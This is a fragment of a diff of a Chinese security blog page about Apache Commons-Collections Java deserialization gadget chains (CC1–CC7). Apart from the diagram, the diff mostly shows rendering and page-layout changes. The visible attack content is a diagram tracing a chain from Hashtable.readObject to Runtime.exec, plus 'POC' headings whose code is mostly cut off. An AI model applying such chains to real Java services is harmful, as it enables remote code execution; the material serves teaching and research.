 <p>最后的POC:</p>
 <pre><code class="java">package org.example;
 import java.io.*;
@@ -2946,15 +2980,21 @@ serialize(hashtable);
 unserialize(&quot;ser.bin&quot;);
 </code></pre>
 <p>利用链如下</p>
-<pre><code class="mermaid">graph TB
-A(&quot;java.util.Hashtable#\nreadObject()&quot;)--&gt;
-B(&quot;java.util.Hashtable#\nreconstitutionPut()&quot;)--&gt;
-C(&quot;java.util.AbstractMap#\nequals()&quot;)--&gt;
-D(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;
-E(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;
-F(&quot;org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;
-G(&quot;Runtime.getRuntime.exec&quot;)
-</code></pre>
+<pre class="mermaid">graph TB
+A("java.util.Hashtable#\nreadObject()")-->
+B("java.util.Hashtable#\nreconstitutionPut()")-->
+C("java.util.AbstractMap#\nequals()")-->
+D("org.apache.commons.collections.map.LazyMap#\nget()")-->
+E("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->
+F("org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->
+G("Runtime.getRuntime.exec")</pre>
+
+
+
+
+
+
+
 <p>完整代码：</p>
 <pre><code class="java">package org.example;
 import java.io.*;
@@ -3046,7 +3086,10 @@ public class App
 <p>2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和LazyMap配合使用。</p>
 <p>3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。</p>
 </blockquote>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/">http://example.com/2023/08/02/Commons-Collections反序列化链合集/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/wallhaven-j3eemp_2560x1440.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Laravel漏洞合集</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="迅睿CMS反序列化漏洞"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-jx9odp_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">迅睿CMS反序列化漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-04</div><div class="title">CommonCollections1</div></div></a></div><div><a href="/2023/06/23/CommonsCollections2/" title="CommonsCollections2"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-yjvgzd_2560x1600.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-23</div><div class="title">CommonsCollections2</div></div></a></div><div><a href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-06</div><div class="title">CommonsCollections6</div></div></a></div><div><a href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-08</div><div class="title">Fastjson漏洞分析</div></div></a></div><div><a href="/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="JNDI注入学习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202303212056761.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-19</div><div class="title">JNDI注入学习</div></div></a></div><div><a href="/2023/03/16/Java%E5%8F%8D%E5%B0%84/" title="Java反射"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202303162204108.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-16</div><div class="title">Java反射</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Commons-Collections%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%88%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">Commons-Collections利用链合集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1"><span class="toc-number">1.2.</span> <span class="toc-text">CC1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-8u71"><span class="toc-number">1.2.1.</span> <span class="toc-text">&lt; 8u71</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gt-8u71"><span class="toc-number">1.2.2.</span> <span class="toc-text">&gt; 8u71</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2"><span class="toc-number">1.3.</span> <span class="toc-text">CC2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformingComparator%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.1.</span> <span class="toc-text">TransformingComparator版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">TemplatesImpl版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC3"><span class="toc-number">1.4.</span> <span class="toc-text">CC3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AnnotationInvocationHandler%E7%89%88%E6%9C%AC"><span class="toc-number">1.4.1.</span> <span class="toc-text">AnnotationInvocationHandler版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry%E7%89%88%E6%9C%AC"><span class="toc-number">1.4.2.</span> <span class="toc-text">TiedMapEntry版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC4"><span class="toc-number">1.5.</span> <span class="toc-text">CC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5"><span class="toc-number">1.6.</span> <span class="toc-text">CC5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC1"><span class="toc-number">1.6.1.</span> <span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC2"><span class="toc-number">1.6.2.</span> <span class="toc-text">POC2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">1.7.</span> <span class="toc-text">CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7"><span class="toc-number">1.8.</span> <span class="toc-text">CC7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Laravel漏洞合集"/></a><div class="content"><a class="title" href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集">Laravel漏洞合集</a><time datetime="2023-08-02T13:51:54.000Z" title="发表于 2023-08-02 21:51:54">2023-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/" title="Commons-Collections反序列化链合集"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-j3eemp_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Commons-Collections反序列化链合集"/></a><div class="content"><a class="title" href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/" title="Commons-Collections反序列化链合集">Commons-Collections反序列化链合集</a><time datetime="2023-08-02T13:45:38.000Z" title="发表于 2023-08-02 21:45:38">2023-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="迅睿CMS反序列化漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-jx9odp_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="迅睿CMS反序列化漏洞"/></a><div class="content"><a class="title" href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="迅睿CMS反序列化漏洞">迅睿CMS反序列化漏洞</a><time datetime="2023-07-13T02:29:35.000Z" title="发表于 2023-07-13 10:29:35">2023-07-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP 代码审计"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-y8wozk_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="ThinkPHP 代码审计"/></a><div class="content"><a class="title" href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP 代码审计">ThinkPHP 代码审计</a><time datetime="2023-07-08T04:50:35.000Z" title="发表于 2023-07-08 12:50:35">2023-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="NginxWebUi 任意命令执行漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-vq5d9l_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="NginxWebUi 任意命令执行漏洞"/></a><div class="content"><a class="title" href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="NginxWebUi 任意命令执行漏洞">NginxWebUi 任意命令执行漏洞</a><time datetime="2023-07-01T11:29:59.000Z" title="发表于 2023-07-01 19:29:59">2023-07-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/">http://example.com/2023/08/02/Commons-Collections反序列化链合集/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/wallhaven-j3eemp_2560x1440.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Laravel漏洞合集</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="迅睿CMS反序列化漏洞"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-jx9odp_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">迅睿CMS反序列化漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/06/23/CommonsCollections2/" title="CommonsCollections2"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-yjvgzd_2560x1600.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-23</div><div class="title">CommonsCollections2</div></div></a></div><div><a href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-04</div><div class="title">CommonCollections1</div></div></a></div><div><a href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-06</div><div class="title">CommonsCollections6</div></div></a></div><div><a href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-08</div><div class="title">Fastjson漏洞分析</div></div></a></div><div><a href="/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="JNDI注入学习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202303212056761.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-19</div><div class="title">JNDI注入学习</div></div></a></div><div><a href="/2023/04/02/Java%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="Java代理与动态代理"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-02</div><div class="title">Java代理与动态代理</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Commons-Collections%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%88%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">Commons-Collections利用链合集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1"><span class="toc-number">1.2.</span> <span class="toc-text">CC1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-8u71"><span class="toc-number">1.2.1.</span> <span class="toc-text">&lt; 8u71</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gt-8u71"><span class="toc-number">1.2.2.</span> <span class="toc-text">&gt; 8u71</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2"><span class="toc-number">1.3.</span> <span class="toc-text">CC2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformingComparator%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.1.</span> <span class="toc-text">TransformingComparator版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">TemplatesImpl版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC3"><span class="toc-number">1.4.</span> <span class="toc-text">CC3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AnnotationInvocationHandler%E7%89%88%E6%9C%AC"><span class="toc-number">1.4.1.</span> <span class="toc-text">AnnotationInvocationHandler版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry%E7%89%88%E6%9C%AC"><span class="toc-number">1.4.2.</span> <span class="toc-text">TiedMapEntry版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC4"><span class="toc-number">1.5.</span> <span class="toc-text">CC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5"><span class="toc-number">1.6.</span> <span class="toc-text">CC5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC1"><span class="toc-number">1.6.1.</span> <span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC2"><span class="toc-number">1.6.2.</span> <span class="toc-text">POC2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">1.7.</span> <span class="toc-text">CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7"><span class="toc-number">1.8.</span> <span class="toc-text">CC7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Laravel漏洞合集"/></a><div class="content"><a class="title" href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集">Laravel漏洞合集</a><time datetime="2023-08-02T13:51:54.000Z" title="发表于 2023-08-02 21:51:54">2023-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/" title="Commons-Collections反序列化链合集"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-j3eemp_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Commons-Collections反序列化链合集"/></a><div class="content"><a class="title" href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/" title="Commons-Collections反序列化链合集">Commons-Collections反序列化链合集</a><time datetime="2023-08-02T13:45:38.000Z" title="发表于 2023-08-02 21:45:38">2023-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="迅睿CMS反序列化漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-jx9odp_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="迅睿CMS反序列化漏洞"/></a><div class="content"><a class="title" href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="迅睿CMS反序列化漏洞">迅睿CMS反序列化漏洞</a><time datetime="2023-07-13T02:29:35.000Z" title="发表于 2023-07-13 10:29:35">2023-07-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP 代码审计"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-y8wozk_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="ThinkPHP 代码审计"/></a><div class="content"><a class="title" href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP 代码审计">ThinkPHP 代码审计</a><time datetime="2023-07-08T04:50:35.000Z" title="发表于 2023-07-08 12:50:35">2023-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="NginxWebUi 任意命令执行漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-vq5d9l_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="NginxWebUi 任意命令执行漏洞"/></a><div class="content"><a class="title" href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="NginxWebUi 任意命令执行漏洞">NginxWebUi 任意命令执行漏洞</a><time datetime="2023-07-01T11:29:59.000Z" title="发表于 2023-07-01 19:29:59">2023-07-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
+  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptioins'));
+  mermaid.initialize(options);
+}</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
   const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
   if ($mermaid.length === 0) return
   const runMermaid = () => {
